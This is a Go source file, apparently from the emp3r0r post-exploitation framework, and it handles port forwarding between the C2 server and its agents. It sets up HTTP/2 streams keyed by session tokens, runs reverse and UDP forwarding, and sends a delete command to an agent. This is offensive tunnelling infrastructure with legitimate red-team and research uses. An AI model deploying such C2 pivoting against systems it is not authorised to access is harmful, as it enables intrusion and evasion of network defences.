package network

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"strings"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// HandlePortMapping handles proxy/port forwarding.
func HandlePortMapping(sh *StreamHandler, wrt http.ResponseWriter, req *http.Request) {
	var err error
	h2x := new(def.H2Conn)
	sh.H2x = h2x
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		logging.Errorf("handlePortForwarding: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	sh.H2x.Ctx = ctx
	sh.H2x.Cancel = cancel

	udpHandler := func(dstAddr string, listener *net.UDPConn) {
		logging.Debugf("Handling UDP packet for %s", dstAddr)
		for ctx.Err() == nil {
			buf := make([]byte, 1024)
			n, err := sh.H2x.Conn.Read(buf)
			if err != nil {
				logging.Errorf("Read error: %v", err)
			}
			udpClientAddr, err := net.ResolveUDPAddr("udp4", dstAddr)
			if err != nil {
				logging.Errorf("Resolve UDP addr error for %s: %v", dstAddr, err)
				return
			}
			if listener == nil {
				logging.Errorf("Nil UDP listener for %s", dstAddr)
				return
			}
			_, err = listener.WriteToUDP(buf[:n], udpClientAddr)
			if err != nil {
				logging.Errorf("Write to UDP client %s: %v", udpClientAddr.String(), err)
			}
		}
	}
	// port-forwarding logic, token parsing and session lookup
	vars := mux.Vars(req)
	token := vars["token"]
	origToken := token
	isSubSession := strings.Contains(token, "_")
	if isSubSession {
		token = strings.Split(token, "_")[0]
	}
	sessionID, err := uuid.Parse(token)
	if err != nil {
		logging.Errorf("Parse UUID failed from %s: %v", req.RemoteAddr, err)
		return
	}
	val, exist := PortFwds.Load(sessionID.String())
	if !exist {
		logging.Debugf("Port mapping session %s unknown. Did you remove it?", sessionID.String())
		return
	}
	pf := val.(*PortFwdSession)
	pf.Sh = make(map[string]*StreamHandler)
	if !isSubSession {
		pf.Sh[sessionID.String()] = sh
		logging.Debugf("Port forwarding connection (%s) from %s", sessionID.String(), req.RemoteAddr)
	} else {
		pf.Sh[origToken] = sh
		if strings.HasSuffix(origToken, "-reverse") {
			logging.Debugf("Reverse connection (%s) from %s", origToken, req.RemoteAddr)
			err = pf.RunReversedPortFwd(sh)
			if err != nil {
				logging.Errorf("RunReversedPortFwd error: %v", err)
			}
		} else if strings.HasSuffix(origToken, "-udp") {
			dstAddr := strings.Split(strings.Split(origToken, "_")[1], "-udp")[0]
			go udpHandler(dstAddr, pf.Listener)
		}
	}
	defer func() {
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				logging.Errorf("Close error in port forwarding: %v", err)
			}
		}
		if origToken != sessionID.String() {
			cancel()
			logging.Debugf("Closed sub-connection %s", origToken)
			return
		}
		if val, exist := PortFwds.Load(sessionID.String()); exist {
			pf := val.(*PortFwdSession)
			pf.Cancel()
		} else {
			logging.Debugf("Port mapping %s not found (likely deleted)", sessionID.String())
		}
		cancel()
		logging.Debugf("Closed port forwarding connection from %s", req.RemoteAddr)
	}()
	for pf.Ctx.Err() == nil {
		_, exist := PortFwds.Load(sessionID.String())
		if !exist {
			logging.Warningf("Port mapping %s disconnected", sessionID.String())
			return
		}
		util.TakeASnap(false)
	}
}

// DeletePortFwdSession deletes a port mapping session by ID.
// Returns error if session not found or deletion fails.
func DeletePortFwdSession(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("no session ID provided")
	}

	val, exists := PortFwds.Load(sessionID)
	if !exists {
		return fmt.Errorf("session %s not found", sessionID)
	}
	session := val.(*PortFwdSession)

	// Tell agent to delete the port mapping
	err := session.SendCmdFunc(fmt.Sprintf("%s --id %s", def.C2CmdDeletePortFwd, sessionID), "", session.Agent.Tag)
	if err != nil {
		logging.Warningf("Tell agent %s to delete port mapping %s: %v", session.Agent.Tag, sessionID, err)
	}

	// Cancel and delete locally
	session.Cancel()
	PortFwds.Delete(sessionID)

	if session.UnregisterFunc != nil {
		if err = session.UnregisterFunc(sessionID); err != nil {
			logging.Errorf("DeletePortFwdSession: failed to unregister %s: %v", sessionID, err)
		}
	}

	logging.Debugf("Deleted port forwarding session %s", sessionID)
	return nil
}
